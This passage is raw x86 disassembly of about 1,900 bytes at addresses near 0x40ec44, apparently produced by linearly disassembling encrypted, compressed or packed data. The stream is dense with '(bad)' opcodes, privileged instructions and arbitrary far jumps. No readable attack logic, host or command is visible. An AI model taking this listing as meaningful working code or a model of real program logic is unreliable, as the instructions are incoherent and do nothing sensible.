  40ec44:	hlt    
  40ec45:	data16 cld 
  40ec47:	cs jg  0x40ecc3
  40ec4a:	scas   eax,DWORD PTR es:[edi]
  40ec4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ec4c:	mov    edx,0x72325cdf
  40ec51:	xchg   esp,esi
  40ec53:	je     0x40ec8e
  40ec55:	inc    ebx
  40ec56:	stos   DWORD PTR es:[edi],eax
  40ec57:	cmp    BYTE PTR [eax-0x20],dl
  40ec5a:	rcl    DWORD PTR [edi],1
  40ec5c:	pop    ebx
  40ec5d:	dec    ebx
  40ec5e:	aad    0x12
  40ec60:	push   ss
  40ec61:	loope  0x40ecb5
  40ec63:	pop    eax
  40ec64:	or     al,BYTE PTR [eax+0x5ca575ce]
  40ec6a:	cmp    eax,0x5a9c65c8
  40ec6f:	push   edi
  40ec70:	jno    0x40ec15
  40ec72:	cwde   
  40ec73:	mov    bh,0xef
  40ec75:	jp     0x40ec1c
  40ec77:	adc    esi,ecx
  40ec79:	pop    ebx
  40ec7a:	int3   
  40ec7b:	adc    al,0xf1
  40ec7d:	dec    esi
  40ec7e:	icebp  
  40ec7f:	loope  0x40ec6f
  40ec81:	std    
  40ec82:	cmp    al,0xae
  40ec84:	js     0x40ec40
  40ec86:	jg     0x40ecc3
  40ec88:	xchg   ebx,eax
  40ec89:	imul   ebp,DWORD PTR [edx+0x6579f133],0xf41fd0f5
  40ec93:	cs fs or al,0x3c
  40ec97:	out    0x7f,al
  40ec99:	push   ss
  40ec9a:	(bad)  
  40ec9b:	sbb    BYTE PTR [eax+0x15],0x9e
  40ec9f:	fdiv   DWORD PTR [edx-0x118b0055]
  40eca5:	pop    es
  40eca6:	pop    ecx
  40eca7:	mov    al,ds:0xa48ac7f1
  40ecac:	jno    0x40ecae
  40ecae:	sub    eax,0x85d41c3f
  40ecb3:	or     eax,0x3612034
  40ecb8:	out    dx,eax
  40ecb9:	ficomp DWORD PTR [esi+0x64]
  40ecbc:	hlt    
  40ecbd:	pushf  
  40ecbe:	aad    0x84
  40ecc0:	mov    bl,0x16
  40ecc2:	leave  
  40ecc3:	xor    DWORD PTR [edi],ecx
  40ecc5:	xor    eax,DWORD PTR [ecx+0x92893f2]
  40eccb:	ss nop
  40eccd:	dec    ebx
  40ecce:	aad    0x2f
  40ecd0:	sbb    DWORD PTR [eax],ecx
  40ecd2:	sub    edx,edi
  40ecd4:	scas   al,BYTE PTR es:[edi]
  40ecd5:	jp     0x40ec5d
  40ecd7:	cmc    
  40ecd8:	test   al,0x5f
  40ecda:	lahf   
  40ecdb:	rcr    BYTE PTR [edi],cl
  40ecdd:	or     eax,0x90e07964
  40ece2:	icebp  
  40ece3:	jo     0x40ed4a
  40ece5:	mov    al,ds:0x2869f4d1
  40ecea:	push   eax
  40eceb:	sbb    DWORD PTR [ecx-0x18],esi
  40ecee:	out    dx,eax
  40ecef:	(bad)  [eax-0x36]
  40ecf2:	and    eax,0xd12019e3
  40ecf7:	loopne 0x40ed23
  40ecf9:	imul   ebp,DWORD PTR [edi+ecx*8],0x7b
  40ecfd:	retf   0x1b14
  40ed00:	scas   al,BYTE PTR es:[edi]
  40ed01:	pop    ds
  40ed02:	popa   
  40ed03:	cli    
  40ed04:	push   ss
  40ed05:	adc    cl,BYTE PTR [ebp-0x6e6f7736]
  40ed0b:	jne    0x40eca9
  40ed0d:	jns    0x40ed61
  40ed0f:	imul   edx,DWORD PTR [edi],0xffffff95
  40ed12:	test   al,0xb3
  40ed14:	jbe    0x40ed54
  40ed16:	stos   BYTE PTR es:[edi],al
  40ed17:	push   eax
  40ed18:	je     0x40ed5c
  40ed1a:	push   ebp
  40ed1b:	aas    
  40ed1c:	clc    
  40ed1d:	mov    dh,0x6d
  40ed1f:	jl     0x40ed4d
  40ed21:	xor    DWORD PTR [edx-0x2400022a],esi
  40ed27:	sbb    ah,bh
  40ed29:	enter  0x39d5,0x5
  40ed2d:	or     eax,0xa312a98e
  40ed32:	sbb    esi,DWORD PTR [ebp-0x74]
  40ed35:	mov    ecx,0xf6524718
  40ed3a:	sbb    al,0x4d
  40ed3c:	jno    0x40ed09
  40ed3e:	push   es
  40ed3f:	pusha  
  40ed40:	test   al,0xdf
  40ed42:	jnp    0x40ed56
  40ed44:	inc    edx
  40ed45:	cmp    al,BYTE PTR ds:[esp+0x48a354a0]
  40ed4d:	dec    ecx
  40ed4e:	not    DWORD PTR [edi-0x145a4e8e]
  40ed54:	icebp  
  40ed55:	inc    ebp
  40ed56:	pop    ss
  40ed57:	call   0x5e7f:0x75c358d1
  40ed5e:	outs   dx,BYTE PTR ds:[esi]
  40ed5f:	es jns 0x40edb9
  40ed62:	cmc    
  40ed63:	ds lock loope 0x40edac
  40ed67:	mov    ebx,0xf7d49574
  40ed6c:	adc    dl,bh
  40ed6e:	pop    ds
  40ed6f:	adc    eax,0x74ebd745
  40ed74:	xchg   edx,eax
  40ed75:	in     eax,dx
  40ed76:	jl     0x40ed95
  40ed78:	sub    edx,ebp
  40ed7a:	dec    eax
  40ed7b:	enter  0xa71,0x1d
  40ed7f:	loop   0x40edce
  40ed81:	fcmovnu st,st(4)
  40ed83:	mov    dh,0x6b
  40ed85:	and    BYTE PTR [edx+edi*2+0x44aac908],al
  40ed8c:	mov    DWORD PTR [ebp+0x2353e4d5],esi
  40ed92:	bound  edx,QWORD PTR [edx+0x4b]
  40ed95:	push   ds
  40ed96:	icebp  
  40ed97:	je     0x40ee09
  40ed99:	jle    0x40edef
  40ed9b:	popf   
  40ed9c:	loop   0x40ed43
  40ed9e:	ins    DWORD PTR es:[edi],dx
  40ed9f:	idiv   BYTE PTR [edi+ecx*2+0x71]
  40eda3:	js     0x40edcd
  40eda5:	mov    ds:0xe7731a46,eax
  40edaa:	xchg   ebx,eax
  40edab:	arpl   WORD PTR [eax],ax
  40edad:	and    cl,cl
  40edaf:	cmova  edi,DWORD PTR [edx+0x21]
  40edb3:	xchg   esp,eax
  40edb4:	stos   BYTE PTR es:[edi],al
  40edb5:	lods   al,BYTE PTR ds:[esi]
  40edb6:	aad    0xf7
  40edb8:	and    eax,0x5e989b9f
  40edbd:	xor    ebp,ebx
  40edbf:	je     0x40ee19
  40edc1:	daa    
  40edc2:	sbb    al,0xad
  40edc4:	sub    DWORD PTR [esi],0x67
  40edc7:	shl    DWORD PTR [edx+ebx*1-0x53],1
  40edcb:	cmp    ecx,ebp
  40edcd:	fnsave [eax]
  40edcf:	add    eax,0xbd84d64c
  40edd4:	js     0x40ee19
  40edd6:	fsubr  DWORD PTR [ebp-0x49]
  40edd9:	repz sti 
  40eddb:	retf   0x71f1
  40edde:	cmp    eax,0x879171dc
  40ede3:	mov    ds:0x120639b2,al
  40ede8:	pop    ds
  40ede9:	and    BYTE PTR [esi-0x770009fe],cl
  40edef:	leave  
  40edf0:	pop    ecx
  40edf1:	inc    edi
  40edf2:	aad    0x2b
  40edf4:	lods   eax,DWORD PTR ds:[esi]
  40edf5:	push   cs
  40edf6:	xor    al,0x6
  40edf8:	test   BYTE PTR [ecx+0x7d267502],ch
  40edfe:	sti    
  40edff:	lahf   
  40ee00:	dec    DWORD PTR [ebp+0x52713474]
  40ee06:	ss fsubr st(7),st
  40ee09:	adc    al,0xb7
  40ee0b:	cmc    
  40ee0c:	pop    esi
  40ee0d:	push   ds
  40ee0e:	shl    BYTE PTR [ebp-0x6f],cl
  40ee11:	(bad)  
  40ee13:	add    bh,al
  40ee15:	dec    ebx
  40ee16:	inc    esp
  40ee17:	retf   0x867f
  40ee1a:	push   ss
  40ee1b:	push   edi
  40ee1c:	mov    ah,0x9f
  40ee1e:	mov    es,WORD PTR [eax]
  40ee20:	pop    es
  40ee21:	jg     0x40ee9e
  40ee23:	xchg   esp,eax
  40ee24:	pop    eax
  40ee25:	cmp    ebx,DWORD PTR [esi]
  40ee27:	jne    0x40ee88
  40ee29:	mov    ecx,0xa059fa7
  40ee2e:	(bad)  
  40ee2f:	cmc    
  40ee30:	test   cl,bh
  40ee32:	cmp    eax,0x34e2cc67
  40ee37:	je     0x40ee6a
  40ee39:	dec    ecx
  40ee3a:	je     0x40eeb1
  40ee3c:	clc    
  40ee3d:	arpl   dx,sp
  40ee3f:	cwde   
  40ee40:	mov    al,0x9f
  40ee42:	xor    dl,BYTE PTR [eax+ecx*4+0x71ae7a6a]
  40ee49:	iret   
  40ee4a:	sbb    al,ah
  40ee4c:	(bad)  
  40ee4d:	into   
  40ee4e:	sub    eax,0xd291ac63
  40ee53:	jne    0x40edfb
  40ee55:	sub    DWORD PTR [edi+esi*8-0x5914bbfb],0x87c2f472
  40ee60:	sub    dl,BYTE PTR [ebx+ecx*8+0x74]
  40ee64:	inc    ecx
  40ee65:	xchg   BYTE PTR [edi],cl
  40ee67:	jne    0x40ee23
  40ee69:	jmp    0x82c3:0x9151fbbd
  40ee70:	xchg   DWORD PTR [esi-0xa8d44d9],ebp
  40ee76:	add    eax,0xa292259d
  40ee7b:	sbb    al,0xe1
  40ee7d:	inc    edx
  40ee7e:	popf   
  40ee7f:	jne    0x40eea0
  40ee81:	sub    DWORD PTR [edi-0x5b5087ee],edx
  40ee87:	xor    dh,BYTE PTR [ecx+0x43]
  40ee8a:	pusha  
  40ee8b:	test   DWORD PTR [ebx],ecx
  40ee8d:	or     BYTE PTR [ebp-0x7c40237],cl
  40ee93:	dec    eax
  40ee94:	pop    esi
  40ee95:	and    ebx,DWORD PTR [esi]
  40ee97:	pop    esp
  40ee98:	sbb    DWORD PTR [edi-0x53],esi
  40ee9b:	push   ebx
  40ee9c:	ss inc edx
  40ee9e:	aad    0x75
  40eea0:	test   eax,0x12833cdf
  40eea5:	jmp    0x40ee58
  40eea7:	jne    0x40ee61
  40eea9:	xchg   DWORD PTR [ebx+0x26],esp
  40eeac:	mov    BYTE PTR [ecx-0x726fde3c],bl
  40eeb2:	aam    0x34
  40eeb4:	mov    cl,0x4b
  40eeb6:	idiv   BYTE PTR [edx+edx*8+0x487c65ee]
  40eebd:	cmp    al,0xde
  40eebf:	sbb    al,0xb8
  40eec1:	popf   
  40eec2:	jl     0x40ef33
  40eec4:	out    dx,al
  40eec5:	mov    edi,0x20d8136b
  40eeca:	aad    0x1
  40eecc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eecd:	jno    0x40eecc
  40eecf:	mov    WORD PTR ds:0xfd756c53,fs
  40eed5:	call   0xa10:0x3e3ce78e
  40eedc:	xchg   ebp,eax
  40eedd:	aam    0x38
  40eedf:	mov    al,0x71
  40eee1:	push   es
  40eee2:	dec    edi
  40eee3:	jo     0x40ef0c
  40eee5:	push   esp
  40eee6:	jae    0x40ef5d
  40eee8:	jne    0x40ef5d
  40eeea:	mov    ecx,0xcba36ae7
  40eeef:	mov    es,WORD PTR [eax+0x72d932c3]
  40eef5:	jg     0x40ef3d
  40eef7:	and    cl,al
  40eef9:	mov    WORD PTR [esp+eax*4-0x4f],ss
  40eefd:	inc    ebp
  40eefe:	jbe    0x40ef60
  40ef00:	push   ecx
  40ef01:	fcomp  QWORD PTR [ecx+edx*8+0x56]
  40ef05:	fcmovnbe st,st(5)
  40ef07:	in     al,0xc9
  40ef09:	ss (bad) 
  40ef0b:	fidiv  DWORD PTR [ebp+0x70]
  40ef0e:	test   al,0xc1
  40ef10:	ds inc ecx
  40ef12:	aad    0xb8
  40ef14:	js     0x40ef8f
  40ef16:	out    dx,al
  40ef17:	repnz test eax,0xde88f398
  40ef1d:	adc    BYTE PTR [ebp+0xd],0xc2
  40ef21:	iret   
  40ef22:	dec    edi
  40ef23:	scas   eax,DWORD PTR es:[edi]
  40ef24:	pop    esp
  40ef25:	and    bl,al
  40ef27:	mov    di,ds
  40ef2a:	fmul   DWORD PTR [ecx-0x36]
  40ef2d:	adc    ebp,0x4f
  40ef30:	mov    ah,0xd7
  40ef32:	out    0x3a,al
  40ef34:	push   eax
  40ef35:	test   eax,0x1347665
  40ef3a:	add    edi,edi
  40ef3c:	lds    edi,FWORD PTR [edx-0x23]
  40ef3f:	inc    esp
  40ef40:	int    0x3e
  40ef42:	aad    0x29
  40ef44:	cs push es
  40ef46:	test   al,0x8b
  40ef48:	mov    ecx,0x2975c39b
  40ef4d:	and    esp,ebx
  40ef4f:	enter  0xe267,0xb0
  40ef53:	aad    0x74
  40ef55:	cld    
  40ef56:	jno    0x40ef32
  40ef58:	lea    edx,[edi-0x7cc5b323]
  40ef5e:	and    al,0x7c
  40ef60:	pop    edx
  40ef61:	dec    ecx
  40ef62:	mov    ecx,0x6700594d
  40ef67:	out    0x84,eax
  40ef69:	call   0xb532:0x74e622e3
  40ef70:	fistp  QWORD PTR [edi-0x10]
  40ef73:	pop    es
  40ef74:	sub    al,0x12
  40ef76:	mov    eax,0x747a3e75
  40ef7b:	mov    bh,0x63
  40ef7d:	adc    DWORD PTR [edi],ebp
  40ef7f:	push   ebp
  40ef80:	jae    0x40ef5d
  40ef82:	push   ebx
  40ef83:	int    0x93
  40ef85:	lahf   
  40ef86:	push   ss
  40ef87:	xor    eax,0x74da100d
  40ef8c:	jns    0x40ef1a
  40ef8e:	mov    dh,0x8e
  40ef90:	jae    0x40ef89
  40ef92:	outs   dx,BYTE PTR ds:[esi]
  40ef93:	cli    
  40ef94:	jno    0x40ef66
  40ef96:	or     bh,dh
  40ef98:	iret   
  40ef99:	lods   al,BYTE PTR ds:[esi]
  40ef9a:	std    
  40ef9b:	mov    ds:0x7525037e,al
  40efa0:	mov    eax,gs
  40efa2:	repnz cmp esi,DWORD PTR [esi-0x7a]
  40efa6:	sub    BYTE PTR [edx],ch
  40efa8:	jno    0x40ef84
  40efaa:	int    0xd8
  40efac:	call   0xdfef6cb4
  40efb1:	and    BYTE PTR [ebp-0xbf7e4a9],cl
  40efb7:	or     BYTE PTR [ebx],ch
  40efb9:	pusha  
  40efba:	popf   
  40efbb:	cmp    al,0x7b
  40efbd:	xchg   ebp,eax
  40efbe:	(bad)  
  40efbf:	addr16 push 0xfe0a0d2
  40efc5:	ret    0x6ea9
  40efc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40efc9:	pushf  
  40efca:	cs xchg ebx,eax
  40efcc:	inc    eax
  40efcd:	inc    ebx
  40efce:	repnz aaa 
  40efd0:	and    eax,0x69bdcd8d
  40efd5:	dec    esp
  40efd6:	dec    eax
  40efd7:	inc    esi
  40efd8:	js     0x40eff2
  40efda:	xchg   ecx,eax
  40efdb:	adc    al,0x1e
  40efdd:	sub    eax,0xd0b78eb5
  40efe2:	cmp    dh,dl
  40efe4:	mov    cl,0x3e
  40efe6:	dec    ebp
  40efe7:	cmp    BYTE PTR [ecx-0x42],bl
  40efea:	stc    
  40efeb:	hlt    
  40efec:	idiv   DWORD PTR [eax+0xec2ab0]
  40eff2:	mov    eax,0xbe61713b
  40eff7:	xchg   BYTE PTR [eax+0xf],dh
  40effa:	cmp    bh,BYTE PTR ds:0x8890206b
  40f000:	xchg   edi,eax
  40f001:	outs   dx,DWORD PTR ds:[esi]
  40f002:	pop    edi
  40f003:	sar    BYTE PTR [eax+0x5297d520],cl
  40f009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f00a:	or     al,0x69
  40f00c:	xor    esi,DWORD PTR [ebp+0x41647a03]
  40f012:	cmp    DWORD PTR [ebp-0x59a1ffd],ebx
  40f018:	rcr    DWORD PTR [edi-0x4262522b],cl
  40f01e:	jle    0x40f055
  40f020:	mov    ch,0x56
  40f022:	jno    0x40f09e
  40f024:	inc    ebp
  40f025:	jmp    0x16d6:0x197e7cc2
  40f02c:	(bad)  
  40f02d:	mov    al,ds:0x1fdc84f9
  40f032:	cwde   
  40f033:	push   0xf51f2dc0
  40f038:	xchg   eax,ecx
  40f03a:	aad    0x0
  40f03c:	cmp    al,0x83
  40f03e:	pushf  
  40f03f:	and    eax,0x5f64ef7a
  40f044:	sahf   
  40f045:	pop    ds
  40f046:	pop    edi
  40f047:	xchg   ebp,eax
  40f048:	(bad)  
  40f049:	mov    eax,eax
  40f04b:	adc    dl,BYTE PTR [esi+0x2739dccc]
  40f051:	xor    DWORD PTR [eax+0x1a],ecx
  40f054:	mov    cl,0x19
  40f056:	stos   DWORD PTR es:[edi],eax
  40f057:	adc    al,0xa0
  40f059:	pop    ds
  40f05a:	jns    0x40f072
  40f05c:	imul   bl
  40f05e:	loope  0x40f05a
  40f060:	js     0x40f02e
  40f062:	aad    0x83
  40f064:	mov    eax,ds:0x31ce2d67
  40f069:	dec    esi
  40f06a:	ja     0x40eff7
  40f06c:	sbb    eax,0x1974ee61
  40f071:	mov    dl,0xde
  40f073:	adc    eax,0x3de37a4b
  40f078:	dec    edi
  40f079:	sub    eax,0xf301f547
  40f07e:	or     eax,ebp
  40f080:	mov    al,ds:0x2fa1c31f
  40f085:	dec    ecx
  40f086:	retf   0x5d0c
  40f089:	sub    ebp,edx
  40f08b:	cld    
  40f08c:	retf   0x72c
  40f08f:	sbb    eax,0x8b43d661
  40f094:	or     ebx,eax
  40f096:	mov    DWORD PTR [ebp+edi*8-0x16],edi
  40f09a:	mov    eax,0xe2abdce5
  40f09f:	(bad)  [ecx+0x9]
  40f0a2:	call   0xaa0a3e24
  40f0a7:	out    0x26,eax
  40f0a9:	and    ch,cl
  40f0ab:	inc    edi
  40f0ac:	adc    ebx,DWORD PTR ds:0x9474af1d
  40f0b2:	aad    0xb5
  40f0b4:	test   eax,0x36e62f9b
  40f0b9:	mov    esi,0xb551759f
  40f0be:	ret    
  40f0bf:	shl    DWORD PTR [ebp-0x17],1
  40f0c2:	pop    ebp
  40f0c3:	pop    es
  40f0c4:	jno    0x40f0f0
  40f0c6:	mov    edx,0x4bc7944d
  40f0cb:	push   esp
  40f0cc:	sahf   
  40f0cd:	pop    ds
  40f0ce:	push   cs
  40f0cf:	xchg   ebx,eax
  40f0d0:	dec    edi
  40f0d1:	repz pop esi
  40f0d3:	mov    al,ds:0x20ec9f18
  40f0d8:	repz mov al,0xda
  40f0db:	shr    DWORD PTR [ebx+0xeb058db],cl
  40f0e1:	mov    al,0x5c
  40f0e3:	sbb    eax,esp
  40f0e5:	pop    ds
  40f0e6:	xor    al,dl
  40f0e8:	sar    BYTE PTR [edi],cl
  40f0ea:	and    DWORD PTR [ebx-0x482a9be8],esi
  40f0f0:	sbb    al,0xf5
  40f0f2:	cmp    eax,0x4f6105c0
  40f0f7:	jns    0x40f086
  40f0f9:	jbe    0x40f119
  40f0fb:	xchg   eax,ebp
  40f0fd:	fistp  WORD PTR [ebx]
  40f0ff:	sub    al,0x1d
  40f101:	dec    esp
  40f102:	aad    0x96
  40f104:	push   0x7b
  40f106:	cld    
  40f107:	pop    ecx
  40f108:	leave  
  40f109:	popf   
  40f10a:	rcl    DWORD PTR [ecx-0xaeece03],cl
  40f110:	in     eax,dx
  40f111:	inc    eax
  40f112:	ss mov ebx,0x890e1bab
  40f118:	pop    ebx
  40f119:	fstp   TBYTE PTR [eax]
  40f11b:	cmc    
  40f11c:	sbb    ah,bh
  40f11e:	enter  0x1c29,0xbe
  40f122:	mov    dl,0x75
  40f124:	push   edi
  40f125:	popf   
  40f126:	or     DWORD PTR [esi],0x7f
  40f129:	in     eax,dx
  40f12a:	inc    eax
  40f12b:	lods   al,BYTE PTR ds:[esi]
  40f12c:	cmp    BYTE PTR [eax],0x59
  40f12f:	add    DWORD PTR [eax+eiz*4-0x44],edx
  40f133:	icebp  
  40f134:	pop    esp
  40f135:	xchg   edx,eax
  40f136:	in     al,dx
  40f137:	je     0x40f187
  40f139:	bound  eax,QWORD PTR [edx+eax*2+0x1e]
  40f13d:	dec    ebx
  40f13e:	add    ecx,DWORD PTR [eax]
  40f140:	jno    0x40f109
  40f142:	ins    BYTE PTR es:[edi],dx
  40f143:	sub    al,0x69
  40f145:	cmp    eax,0x1faa18b5
  40f14a:	pushf  
  40f14b:	dec    edi
  40f14c:	cmp    eax,0x679137c
  40f151:	mov    al,ds:0x2d64cd5
  40f156:	inc    esi
  40f157:	lea    esp,[eax]
  40f159:	outs   dx,BYTE PTR ds:[esi]
  40f15a:	xchg   ecx,eax
  40f15b:	jne    0x40f105
  40f15d:	xlat   BYTE PTR ds:[ebx]
  40f15e:	and    eax,0xb9c56334
  40f163:	cmp    al,0x71
  40f165:	xchg   ecx,eax
  40f166:	int3   
  40f167:	mov    dh,0x83
  40f169:	neg    BYTE PTR ds:0xd11ffce9
  40f16f:	rcr    DWORD PTR [esi],0x9c
  40f172:	pop    es
  40f173:	jmp    0x40f168
  40f175:	xlat   BYTE PTR fs:[ebx]
  40f177:	xchg   ecx,eax
  40f178:	fisubr WORD PTR [esi-0x1cda576b]
  40f17e:	in     al,dx
  40f17f:	push   esp
  40f180:	loope  0x40f200
  40f182:	mov    esp,0xeb2ba1ae
  40f187:	lock xchg esi,eax
  40f189:	cs sbb eax,0x9ee51184
  40f18f:	xchg   esp,eax
  40f190:	cdq    
  40f191:	push   cs
  40f192:	(bad)  
  40f193:	test   WORD PTR [edx-0x342999ca],0x751c
  40f19c:	mov    esi,0xc5ba9d08
  40f1a1:	pop    DWORD PTR [edi]
  40f1a3:	dec    esp
  40f1a4:	jno    0x40f205
  40f1a6:	ret    0x188d
  40f1a9:	push   edi
  40f1aa:	xchg   ebx,eax
  40f1ab:	jb     0x40f182
  40f1ad:	xchg   edi,eax
  40f1ae:	mov    cl,0x63
  40f1b0:	test   DWORD PTR [edi],ebx
  40f1b2:	mov    bl,0xcf
  40f1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b5:	repz leave 
  40f1b7:	inc    edi
  40f1b8:	loope  0x40f1b9
  40f1ba:	aad    0x7
  40f1bc:	shl    DWORD PTR [eax+0x1f5f5084],0xaf
  40f1c3:	xchg   ecx,eax
  40f1c4:	push   ds
  40f1c5:	xchg   BYTE PTR [eax],bh
  40f1c7:	xor    eax,0xffe886a3
  40f1cc:	mov    al,ds:0x7e10d650
  40f1d1:	or     al,0x8f
  40f1d3:	jp     0x40f184
  40f1d5:	test   al,0xf5
  40f1d7:	iret   
  40f1d8:	ret    0x801f
  40f1db:	xor    DWORD PTR [edx],0x76
  40f1de:	jge    0x40f259
  40f1e0:	inc    edi
  40f1e1:	xchg   esi,eax
  40f1e2:	aad    0xc7
  40f1e4:	popa   
  40f1e5:	pop    edx
  40f1e6:	hlt    
  40f1e7:	push   ebp
  40f1e8:	ins    DWORD PTR es:[edi],dx
  40f1e9:	(bad)  
  40f1ea:	mov    BYTE PTR [ebp+0x1d],dh
  40f1ed:	call   0x904c8758
  40f1f2:	je     0x40f210
  40f1f4:	jno    0x40f1f7
  40f1f6:	jbe    0x40f1e5
  40f1f8:	je     0x40f1fd
  40f1fa:	adc    ah,BYTE PTR [edi-0x78]
  40f1fd:	pop    ds
  40f1fe:	outs   dx,BYTE PTR ds:[esi]
  40f1ff:	std    
  40f200:	push   0xffffffec
  40f202:	pop    eax
  40f203:	fcom   QWORD PTR [ebp-0x9372a0c]
  40f209:	xchg   ecx,eax
  40f20a:	in     eax,dx
  40f20b:	inc    ebp
  40f20c:	loop   0x40f28d
  40f20e:	add    ch,cl
  40f210:	leave  
  40f211:	pop    ds
  40f212:	add    esp,DWORD PTR [esi-0x3f]
  40f215:	sub    eax,0xd5e67c59
  40f21a:	aad    0x2c
  40f21c:	or     DWORD PTR [ecx],edi
  40f21e:	jae    0x40f280
  40f220:	add    eax,0xbb691cc5
  40f225:	pop    ds
  40f226:	cmp    ecx,DWORD PTR [ebp+0x7c]
  40f229:	add    edx,DWORD PTR [edi-0x2a645af9]
  40f22f:	mov    edi,DWORD PTR [eax]
  40f231:	stos   DWORD PTR es:[edi],eax
  40f232:	outs   dx,DWORD PTR ds:[esi]
  40f233:	inc    eax
  40f234:	mov    cl,0x32
  40f236:	add    dh,BYTE PTR [ebp+0xe]
  40f239:	ins    BYTE PTR es:[edi],dx
  40f23a:	pop    edx
  40f23b:	xor    dl,BYTE PTR [ebx+0x71a5574b]
  40f241:	arpl   WORD PTR [eax],cx
  40f243:	push   edx
  40f244:	aaa    
  40f245:	jg     0x40f1d3
  40f247:	dec    esp
  40f248:	daa    
  40f249:	and    dl,bl
  40f24b:	xchg   ebx,eax
  40f24c:	(bad)  [ebp-0x68]
  40f24f:	mov    esi,0xaedc64fb
  40f254:	in     eax,dx
  40f255:	inc    ebx
  40f256:	fxam   
  40f258:	xor    DWORD PTR [edx+0x20115aeb],0xb8960d14
  40f262:	mov    edi,0xd61e5f58
  40f267:	fisttp QWORD PTR [ecx+0x6b]
  40f26a:	inc    ecx
  40f26b:	inc    ebx
  40f26c:	sbb    edi,DWORD PTR ss:[edi+0x7e58c3f4]
  40f273:	ss icebp 
  40f275:	rcl    BYTE PTR [edx],1
  40f277:	cdq    
  40f278:	es xchg ebp,eax
  40f27a:	dec    ebp
  40f27b:	int    0x71
  40f27d:	mul    dl
  40f27f:	loop   0x40f214
  40f281:	jge    0x40f26d
  40f283:	or     ecx,DWORD PTR [esi+0x4081611f]
  40f289:	push   ebp
  40f28a:	mov    BYTE PTR [esi-0x8],ah
  40f28d:	adc    ch,0xd6
  40f290:	inc    ebp
  40f291:	das    
  40f292:	test   BYTE PTR [eax+0x2c],al
  40f295:	fcom   QWORD PTR [esp+edi*2-0x2f879942]
  40f29c:	fs inc eax
  40f29e:	les    ebx,FWORD PTR [ebx-0x15]
  40f2a1:	sub    ch,BYTE PTR [ebp+0x4c]
  40f2a4:	jae    0x40f2c1
  40f2a6:	repz enter 0x3524,0xdd
  40f2ab:	push   esp
  40f2ac:	adc    ecx,DWORD PTR [ebp+0x1fd85580]
  40f2b2:	dec    eax
  40f2b3:	xchg   DWORD PTR [ebp+edx*8-0x5b8fca3c],edi
  40f2ba:	aad    0xe2
  40f2bc:	mov    BYTE PTR [esi],0xab
  40f2bf:	sub    BYTE PTR [bx+si-0x24],ah
  40f2c3:	ins    BYTE PTR es:[edi],dx
  40f2c4:	rcr    DWORD PTR [edi],0x75
  40f2c7:	pop    ss
  40f2c8:	or     ah,BYTE PTR [ebx+0x45]
  40f2cb:	daa    
  40f2cc:	pop    ebp
  40f2cd:	cmp    eax,0x8450fc03
  40f2d2:	aad    0xee
  40f2d4:	mov    eax,DWORD PTR [eax+0x1fd06069]
  40f2da:	cmp    edi,DWORD PTR [edi+0x7ad0fa2c]
  40f2e0:	fdivr  st(7),st
  40f2e2:	aad    0x95
  40f2e4:	test   eax,0xe126e7e2
  40f2e9:	cs jl  0x40f2de
  40f2ec:	pop    esp
  40f2ed:	and    ch,ah
  40f2ef:	adc    ch,BYTE PTR [ebx-0x4cd056b6]
  40f2f5:	mov    esp,0xe33ad0dc
  40f2fa:	cli    
  40f2fb:	jge    0x40f34e
  40f2fd:	inc    esi
  40f2fe:	xchg   esi,eax
  40f2ff:	setg   BYTE PTR [ebx]
  40f302:	mov    DWORD PTR [ebp-0x43],esi
  40f305:	xor    BYTE PTR [eax-0xa7198ac],0xed
  40f30c:	addr16 stc 
  40f30e:	aad    0x9f
  40f310:	inc    ebx
  40f311:	xor    esp,ecx
  40f313:	add    DWORD PTR [esi+0x43],esi
  40f316:	xor    al,dh
  40f318:	xor    dl,BYTE PTR [ebx-0x67958ae1]
  40f31e:	aaa    
  40f31f:	inc    esi
  40f320:	out    dx,eax
  40f321:	jmp    FWORD PTR [bx+di+0x7ff0]
  40f326:	fisubr DWORD PTR ds:0xf0ac2769
  40f32c:	xor    DWORD PTR [edx+0x204f0a82],esp
  40f332:	mov    dl,bl
  40f334:	push   edx
  40f335:	mov    cl,al
  40f337:	xor    DWORD PTR [edi+0x6d63d849],eax
  40f33d:	mov    eax,0xcfd08a24
  40f342:	mov    cl,0xd2
  40f344:	sbb    ah,BYTE PTR [eax]
  40f346:	xor    esp,esp
  40f348:	cld    
  40f349:	adc    DWORD PTR [eax-0x4e],ecx
  40f34c:	js     0x40f3ac
  40f34e:	xlat   BYTE PTR ds:[ebx]
  40f34f:	jae    0x40f314
  40f351:	mov    al,0xd6
  40f353:	(bad)  
  40f354:	jae    0x40f3b8
  40f356:	inc    edx
  40f357:	ins    DWORD PTR es:[edi],dx
  40f358:	in     eax,0xb7
  40f35a:	int3   
  40f35b:	jne    0x40f3c0
  40f35d:	sbb    BYTE PTR [ebp-0x6e],0x58
  40f361:	or     eax,0x565fada
  40f366:	(bad)  
  40f367:	xor    al,0x64
  40f369:	stc    
  40f36a:	int    0xfe
  40f36c:	push   edx
  40f36d:	addr16 inc ebx
  40f36f:	scas   al,BYTE PTR es:[edi]
  40f370:	not    BYTE PTR [ebx-0x2b]
  40f373:	iret   
  40f374:	pop    eax
  40f375:	mov    bh,0x90
  40f377:	cmp    ecx,0xa05af2b5
  40f37d:	mov    ebx,0x8031c133
  40f382:	pop    eax
  40f383:	xchg   esi,eax
  40f384:	es push edx
  40f386:	mov    dh,0xb4
  40f388:	add    DWORD PTR [ebx+ecx*2],ecx
  40f38b:	jne    0x40f3c2
  40f38d:	ds leave 
  40f38f:	jge    0x40f3c0
  40f391:	mov    bl,0x19
  40f393:	ret    
  40f394:	jno    0x40f3b9
  40f396:	and    BYTE PTR [esi-0x4a287e7a],al
  40f39c:	add    bl,BYTE PTR [ebx+0x7e]
  40f39f:	and    ecx,esi
  40f3a1:	xchg   BYTE PTR [ecx-0x10],ch
  40f3a4:	adc    DWORD PTR [eax+0x166b6d14],0x6171bb46
  40f3ae:	ins    DWORD PTR es:[edi],dx
  40f3af:	cmp    eax,DWORD PTR [ebx+0xc]
  40f3b2:	cmc    
  40f3b3:	rcl    edx,1
  40f3b5:	pop    ds
  40f3b6:	iret   
  40f3b7:	retf   0x828c
  40f3ba:	add    DWORD PTR [eax-0x66],0xffffffed
  40f3be:	aad    0x16
